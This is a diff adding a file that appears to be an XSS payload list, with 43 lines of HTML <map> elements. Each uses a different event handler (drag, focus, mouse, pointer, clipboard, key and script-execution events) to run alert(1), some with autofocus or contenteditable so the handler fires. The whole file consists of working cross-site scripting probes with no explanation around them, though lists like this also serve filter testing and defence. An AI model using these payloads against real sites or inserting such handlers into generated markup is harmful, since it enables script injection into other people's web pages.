@@ -1,0 +1,43 @@
+<map draggable="true" ondrag="alert(1)">test</map>
+<map draggable="true" ondragend="alert(1)">test</map>
+<map draggable="true" ondragenter="alert(1)">test</map>
+<map draggable="true" ondragleave="alert(1)">test</map>
+<map draggable="true" ondragstart="alert(1)">test</map>
+<map id=x tabindex=1 onactivate=alert(1)></map>
+<map id=x tabindex=1 onbeforeactivate=alert(1)></map>
+<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>
+<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>
+<map id=x tabindex=1 onfocus=alert(1)></map>
+<map id=x tabindex=1 onfocusin=alert(1)></map>
+<map onafterscriptexecute=alert(1)><script>1</script>
+<map onbeforecopy="alert(1)" contenteditable>test</map>
+<map onbeforecut="alert(1)" contenteditable>test</map>
+<map onbeforepaste="alert(1)" contenteditable>test</map>
+<map onbeforescriptexecute=alert(1)><script>1</script>
+<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>
+<map onclick="alert(1)">test</map>
+<map oncontextmenu="alert(1)">test</map>
+<map oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<map oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<map ondblclick="alert(1)" autofocus tabindex=1>test</map>
+<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>
+<map onkeydown="alert(1)" contenteditable>test</map>
+<map onkeypress="alert(1)" contenteditable>test</map>
+<map onkeyup="alert(1)" contenteditable>test</map>
+<map onmousedown="alert(1)">test</map>
+<map onmouseenter="alert(1)">test</map>
+<map onmouseleave="alert(1)">test</map>
+<map onmousemove="alert(1)">test</map>
+<map onmouseout="alert(1)">test</map>
+<map onmouseover="alert(1)">test</map>
+<map onmouseup="alert(1)">test</map>
+<map onmousewheel=alert(1)>requires scrolling
+<map onpaste="alert(1)" contenteditable>test</map>
+<map onpointerdown=alert(1)>XSS</map>
+<map onpointerenter=alert(1)>XSS</map>
+<map onpointerleave=alert(1)>XSS</map>
+<map onpointermove=alert(1)>XSS</map>
+<map onpointerout=alert(1)>XSS</map>
+<map onpointerover=alert(1)>XSS</map>
+<map onpointerrawupdate=alert(1)>XSS</map>
+<map onpointerup=alert(1)>XSS</map>
